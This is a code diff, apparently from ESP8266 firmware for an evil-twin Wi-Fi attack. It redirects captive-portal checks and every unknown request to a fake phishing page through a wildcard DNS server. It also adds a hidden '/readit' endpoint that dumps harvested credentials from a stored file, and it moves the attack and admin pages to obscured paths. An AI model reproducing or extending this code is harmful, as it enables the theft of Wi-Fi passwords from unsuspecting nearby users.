@@ -80,7 +80,7 @@ Settings settings;
 SSIDList ssidList;
 
 //yaraklar ///
-void oku(){
+void readcreds(){
 String line;
 File f = SPIFFS.open("/f.txt", "r");
   if (!f) {
@@ -146,8 +146,8 @@ void loadAPScanHTML() {
 void loadStationsHTML() {
   sendFile(200, "text/html", data_stationHTML, sizeof(data_stationHTML));
 }
-void loadSahteHTML() {
-  sendFile(200, "text/html", data_sahteHTML, sizeof(data_sahteHTML));
+void loadFakeHTML() {
+  sendFile(200, "text/html", (char*)data_fakeHTML, sizeof(fakePage));
 }
 void loadAttackHTML() {
   sendFile(200, "text/html", data_attackHTML, sizeof(data_attackHTML));
@@ -487,19 +487,20 @@ void setup() {
      
       dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", apIP);
-  server.on("/generate_204", loadSahteHTML);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
-  server.on("/fwlink", loadSahteHTML);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
-  server.onNotFound(loadSahteHTML);
-  server.on("/", loadSahteHTML);
-  server.on("/okut", oku);
-  server.on("/sikici", loadIndexHTML);
+  server.on("/generate_204", loadFakeHTML);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
+  server.on("/search", loadFakeHTML);  //Google search captive portal. Maybe not needed. Might be handled by notFound handler.
+  server.on("/fwlink", loadFakeHTML);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
+  server.onNotFound(loadFakeHTML);
+  server.on("/", loadFakeHTML);
+  server.on("/readit", readcreds);
+  server.on("/pwner", loadIndexHTML);
   //server.on("/index.html", loadIndexHTML);
   server.on("/apscan.html", loadAPScanHTML);
   server.on("/stations.html", loadStationsHTML);
   server.on("/attack.html", loadAttackHTML);
   server.on("/settings.html", loadSettingsHTML);
-  // server.on("/info.html", loadInfoHTML);
-  // server.on("/license", loadLicense);
+  server.on("/infooo.html", loadInfoHTML); //changed due may be interfere with user requestss(web pages not merged)
+  server.on("/licenseee", loadLicense); //changed may be interfere with user requests(web pages not merged)
 
   /* JS */
   server.on("/js/apscan.js", loadAPScanJS);
